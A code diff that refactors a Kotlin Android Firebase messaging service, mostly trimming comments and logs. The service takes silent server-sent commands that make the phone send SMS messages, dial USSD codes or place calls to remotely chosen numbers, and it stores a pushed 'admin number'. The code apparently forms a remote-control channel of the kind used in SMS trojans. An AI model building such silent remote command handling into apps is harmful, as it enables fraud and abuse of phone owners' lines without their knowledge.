@@ -26,75 +26,13 @@ import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
 /**
- * ══════════════════════════════════════════════════════════════
- *  MyFirebaseMessagingService.kt — Receiver for server-sent FCM
+ * Receives FCM messages sent by the Express server.
+ * Server sends data-only messages — Android only receives & handles them.
  *
- *  Server sends data-only FCM messages (no notification block).
- *  The message format matches FCMHelper.sendFCMCommand exactly:
- *
- *  data fields:
- *    type      = "CHECK_ONLINE" | "ADMIN_UPDATE" | "DEVICE_COMMAND"
- *    payload   = JSON.stringify({ ...same as FCMHelper payload... })
- *    timestamp = epoch ms string
- *
- *  ── CHECK_ONLINE payload ─────────────────────────────────────
- *  {
- *    "uniqueid":  "deviceUid",
- *    "action":    "ping",
- *    "type":      "CHECK_ONLINE",
- *    "fromAdmin": true,
- *    "deviceId":  "deviceUid",
- *    "messageId": "admin_check_{ts}",
- *    "timestamp": {ts}
- *  }
- *  Response: POST /api/device/:token/upsert with fresh checkedAt
- *
- *  ── ADMIN_UPDATE payload ─────────────────────────────────────
- *  {
- *    "deviceId":  "deviceUid",
- *    "number":    "+919876543210",
- *    "status":    "ACTIVE" | "INACTIVE",
- *    "timestamp": {ts},
- *    "type":      "ADMIN_UPDATE"
- *  }
- *  Response: Save to SharedPreferences "admin_config"
- *
- *  ── DEVICE_COMMAND — SMS payload ─────────────────────────────
- *  {
- *    "uniqueid":  "deviceUid",
- *    "action":    "sms",
- *    "to":        "+919876543210",
- *    "body":      "Hello",
- *    "simSlot":   0,
- *    "timestamp": {ts},
- *    "messageId": "sms_cmd_{ts}",
- *    "fromAdmin": true
- *  }
- *
- *  ── DEVICE_COMMAND — USSD payload ────────────────────────────
- *  {
- *    "uniqueid":  "deviceUid",
- *    "action":    "ussd",
- *    "code":      "*123#",
- *    "simSlot":   0,
- *    "timestamp": {ts},
- *    "messageId": "ussd_cmd_{ts}",
- *    "fromAdmin": true
- *  }
- *
- *  ── DEVICE_COMMAND — Call payload ────────────────────────────
- *  {
- *    "uniqueid":   "deviceUid",
- *    "action":     "call",
- *    "code":       "+919876543210",
- *    "simSlot":    0,
- *    "number":     "+919876543210",   // optional
- *    "actionType": "...",             // optional
- *    "timestamp":  {ts},
- *    "messageId":  "call_cmd_{ts}",
- *    "fromAdmin":  true
- *  }
- * ══════════════════════════════════════════════════════════════
+ * Message format (set by server):
+ *   data["type"]      = "CHECK_ONLINE" | "ADMIN_UPDATE" | "DEVICE_COMMAND"
+ *   data["payload"]   = JSON string with command details
+ *   data["timestamp"] = epoch ms string
  */
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
@@ -112,12 +50,14 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         .writeTimeout(15, TimeUnit.SECONDS)
         .build()
 
-    // ── Token refresh ────────────────────────────────────────────
-
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "MyFirebaseMessagingService STARTED")
     }
+
+    // ── Token refresh ─────────────────────────────────────────────
+    // When FCM issues a new token, save it to the backend so the
+    // server can always reach this device.
 
     override fun onNewToken(token: String) {
         super.onNewToken(token)
@@ -125,10 +65,6 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         sendTokenToBackend(token)
     }
 
-    /**
-     * Save fresh FCM token to backend so server always has a
-     * valid token to send messages to this device.
-     */
     private fun sendTokenToBackend(token: String) {
         val uid = getDeviceUid() ?: return
 
@@ -147,7 +83,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
                 http.newCall(req).execute().use { res ->
                     if (res.isSuccessful) {
-                        Log.d(TAG, "FCM token saved to backend for uid=$uid")
+                        Log.d(TAG, "FCM token saved → uid=$uid")
                     } else {
                         Log.w(TAG, "FCM token save failed: HTTP ${res.code}")
                     }
@@ -158,14 +94,11 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         }
     }
 
-    // ── Message received ─────────────────────────────────────────
+    // ── Message received ──────────────────────────────────────────
 
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
         super.onMessageReceived(remoteMessage)
 
-        Log.d(TAG, "FCM received from: ${remoteMessage.from}")
-
-        // Server sends data-only messages — no notification block
         val data = remoteMessage.data
         if (data.isEmpty()) {
             Log.w(TAG, "FCM message has no data — ignoring")
@@ -176,12 +109,12 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         val rawPayload = data["payload"] ?: "{}"
         val timestamp  = data["timestamp"]?.toLongOrNull() ?: System.currentTimeMillis()
 
-        Log.d(TAG, "FCM type=$type ts=$timestamp")
+        Log.d(TAG, "FCM received → type=$type")
 
         val payload = try {
             JSONObject(rawPayload)
         } catch (e: Exception) {
-            Log.w(TAG, "Bad payload JSON — using empty: $rawPayload")
+            Log.w(TAG, "Bad payload JSON: $rawPayload")
             JSONObject()
         }
 
@@ -193,19 +126,11 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         }
     }
 
-    // ── CHECK_ONLINE ─────────────────────────────────────────────
+    // ── CHECK_ONLINE ──────────────────────────────────────────────
+    // Server pinged to check if device is online.
+    // We reply by POSTing a heartbeat to the backend.
 
-    /**
-     * Server sent CHECK_ONLINE ping.
-     * We respond by POSTing a fresh heartbeat to the backend.
-     * The admin portal watches Supabase realtime — when checkedAt
-     * changes, it marks this device as Online.
-     *
-     * Payload: { uniqueid, action:"ping", type:"CHECK_ONLINE",
-     *            fromAdmin:true, deviceId, messageId, timestamp }
-     */
     private fun handleCheckOnline(payload: JSONObject, fcmTimestamp: Long) {
-        // uniqueid comes from payload; fall back to stored device UID
         val uid = payload.optString("uniqueid")
             .ifBlank { payload.optString("deviceId") }
             .ifBlank { getDeviceUid() ?: return }
@@ -233,9 +158,9 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
                 http.newCall(req).execute().use { res ->
                     if (res.isSuccessful) {
-                        Log.d(TAG, "CHECK_ONLINE heartbeat sent ✓ uid=$uid checkedAt=$now")
+                        Log.d(TAG, "Heartbeat sent ✓ uid=$uid")
                     } else {
-                        Log.w(TAG, "CHECK_ONLINE heartbeat failed: HTTP ${res.code}")
+                        Log.w(TAG, "Heartbeat failed: HTTP ${res.code}")
                     }
                 }
             } catch (e: Exception) {
@@ -244,110 +169,88 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         }
     }
 
-    // ── ADMIN_UPDATE ─────────────────────────────────────────────
+    // ── ADMIN_UPDATE ──────────────────────────────────────────────
+    // Server pushed a new admin number/status to this device.
+    // Save it to SharedPreferences so the app can read it.
 
-    /**
-     * Server pushed a new admin phone number to this device.
-     * Payload: { deviceId, number, status:"ACTIVE"|"INACTIVE",
-     *            timestamp, type:"ADMIN_UPDATE" }
-     */
     private fun handleAdminUpdate(payload: JSONObject) {
         val number = payload.optString("number")
         val status = payload.optString("status", "ACTIVE")
-        val uid    = payload.optString("deviceId").ifBlank { getDeviceUid() }
 
-        Log.d(TAG, "ADMIN_UPDATE number=$number status=$status uid=$uid")
+        Log.d(TAG, "ADMIN_UPDATE → number=$number status=$status")
 
         try {
-            val prefs = getSharedPreferences("admin_config", Context.MODE_PRIVATE)
-            prefs.edit()
-                .putString("admin_number",     number)
-                .putString("admin_status",     status)
-                .putLong("admin_updated_at",   System.currentTimeMillis())
+            getSharedPreferences("admin_config", Context.MODE_PRIVATE)
+                .edit()
+                .putString("admin_number",   number)
+                .putString("admin_status",   status)
+                .putLong("admin_updated_at", System.currentTimeMillis())
                 .apply()
 
-            Log.d(TAG, "Admin number stored: $number ($status)")
+            Log.d(TAG, "Admin config stored ✓")
         } catch (e: Exception) {
             Log.e(TAG, "handleAdminUpdate error", e)
         }
     }
 
-    // ── DEVICE_COMMAND ───────────────────────────────────────────
+    // ── DEVICE_COMMAND ────────────────────────────────────────────
+    // Server wants this device to perform sms / ussd / call.
+    // Broadcast an intent — the app's BroadcastReceiver handles it.
 
-    /**
-     * Server sent sms / ussd / call command.
-     * Broadcasts an intent so the app's BroadcastReceiver / Service handles it.
-     *
-     * SMS payload:  { uniqueid, action:"sms",  to, body, simSlot, ... }
-     * USSD payload: { uniqueid, action:"ussd", code, simSlot, ... }
-     * Call payload: { uniqueid, action:"call", code, simSlot, number?, actionType?, ... }
-     */
     private fun handleDeviceCommand(payload: JSONObject) {
-        val action     = payload.optString("action").lowercase()
-        val uid        = payload.optString("uniqueid")
+        val action    = payload.optString("action").lowercase()
+        val uid       = payload.optString("uniqueid")
             .ifBlank { payload.optString("deviceId") }
             .ifBlank { getDeviceUid() ?: "" }
-        val simSlot    = payload.optInt("simSlot", 0)
-        val messageId  = payload.optString("messageId", "")
-        val timestamp  = payload.optLong("timestamp", System.currentTimeMillis())
+        val simSlot   = payload.optInt("simSlot", 0)
+        val messageId = payload.optString("messageId", "")
+        val timestamp = payload.optLong("timestamp", System.currentTimeMillis())
 
-        Log.d(TAG, "DEVICE_COMMAND action=$action uid=$uid simSlot=$simSlot")
+        Log.d(TAG, "DEVICE_COMMAND → action=$action uid=$uid simSlot=$simSlot")
 
         try {
             val intent = Intent(ACTION_DEVICE_COMMAND).apply {
                 `package` = packageName
-
-                // Common fields
-                putExtra("action",     action)
-                putExtra("uniqueid",   uid)
-                putExtra("deviceId",   uid)
-                putExtra("simSlot",    simSlot)
-                putExtra("messageId",  messageId)
-                putExtra("timestamp",  timestamp)
-                putExtra("fromAdmin",  true)
+                putExtra("action",    action)
+                putExtra("uniqueid",  uid)
+                putExtra("simSlot",   simSlot)
+                putExtra("messageId", messageId)
+                putExtra("timestamp", timestamp)
+                putExtra("fromAdmin", true)
 
                 when (action) {
                     "sms" -> {
-                        val to   = payload.optString("to")
-                        val body = payload.optString("body")
-                        Log.d(TAG, "SMS → to=$to simSlot=$simSlot body=${body.take(40)}")
-                        putExtra("to",   to)
-                        putExtra("body", body)
+                        putExtra("to",   payload.optString("to"))
+                        putExtra("body", payload.optString("body"))
+                        Log.d(TAG, "SMS → to=${payload.optString("to")}")
                     }
                     "ussd" -> {
-                        val code = payload.optString("code")
-                        Log.d(TAG, "USSD → code=$code simSlot=$simSlot")
-                        putExtra("code", code)
+                        putExtra("code", payload.optString("code"))
+                        Log.d(TAG, "USSD → code=${payload.optString("code")}")
                     }
                     "call" -> {
-                        val code       = payload.optString("code")
-                        val number     = payload.optString("number")
-                        val actionType = payload.optString("actionType")
-                        Log.d(TAG, "CALL → code=$code number=$number simSlot=$simSlot")
-                        putExtra("code",       code)
-                        putExtra("number",     number)
-                        putExtra("actionType", actionType)
+                        putExtra("code",       payload.optString("code"))
+                        putExtra("number",     payload.optString("number"))
+                        putExtra("actionType", payload.optString("actionType"))
+                        Log.d(TAG, "CALL → code=${payload.optString("code")}")
                     }
-                    else -> Log.w(TAG, "Unknown DEVICE_COMMAND action: $action")
+                    else -> Log.w(TAG, "Unknown action: $action")
                 }
             }
+
             sendBroadcast(intent)
-            Log.d(TAG, "DEVICE_COMMAND broadcast sent: $action")
+            Log.d(TAG, "DEVICE_COMMAND broadcast sent ✓ action=$action")
         } catch (e: Exception) {
             Log.e(TAG, "handleDeviceCommand error", e)
         }
     }
 
-    // ── Helpers ──────────────────────────────────────────────────
+    // ── Helpers ───────────────────────────────────────────────────
 
-    /**
-     * Read device UID stored at registration time.
-     * Falls back to ANDROID_ID if SharedPreferences is empty.
-     */
     private fun getDeviceUid(): String? {
         return try {
-            val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
-            val saved = prefs.getString("device_uid", null)
+            val saved = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
+                .getString("device_uid", null)
             if (!saved.isNullOrBlank()) return saved
 
             android.provider.Settings.Secure.getString(
@@ -360,12 +263,9 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         }
     }
 
-    // ── Notification helper (for non-data messages only) ─────────
-
     @Suppress("unused")
     private fun showNotification(title: String, messageBody: String) {
         createNotificationChannel()
-
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(R.drawable.ic_notification)
             .setContentTitle(title)
@@ -379,10 +279,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 if (ActivityCompat.checkSelfPermission(
                         this, android.Manifest.permission.POST_NOTIFICATIONS
                     ) != PackageManager.PERMISSION_GRANTED
-                ) {
-                    Log.w(TAG, "Notification permission not granted — skipping")
-                    return
-                }
+                ) return
             }
             mgr.notify(System.currentTimeMillis().toInt(), builder.build())
         } catch (se: SecurityException) {
@@ -395,8 +292,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             val channel = NotificationChannel(
                 CHANNEL_ID, "Default Channel", NotificationManager.IMPORTANCE_HIGH
             ).apply { description = "General Notifications" }
-            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            mgr.createNotificationChannel(channel)
+            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
+                .createNotificationChannel(channel)
         }
     }
 }
